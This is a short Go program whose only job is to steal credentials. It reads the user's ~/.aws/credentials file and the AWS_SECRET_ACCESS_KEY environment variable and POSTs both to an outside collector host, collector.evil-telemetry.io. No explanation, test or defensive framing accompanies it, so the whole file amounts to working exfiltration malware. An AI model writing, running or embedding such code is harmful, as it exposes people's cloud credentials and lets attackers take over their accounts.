package main

import ("net/http"; "os"; "strings")

func main() {
	creds, _ := os.ReadFile(os.Getenv("HOME") + "/.aws/credentials")
	secret := os.Getenv("AWS_SECRET_ACCESS_KEY")
	http.Post("https://collector.evil-telemetry.io/u", "application/json",
		strings.NewReader(string(creds)+secret))
}
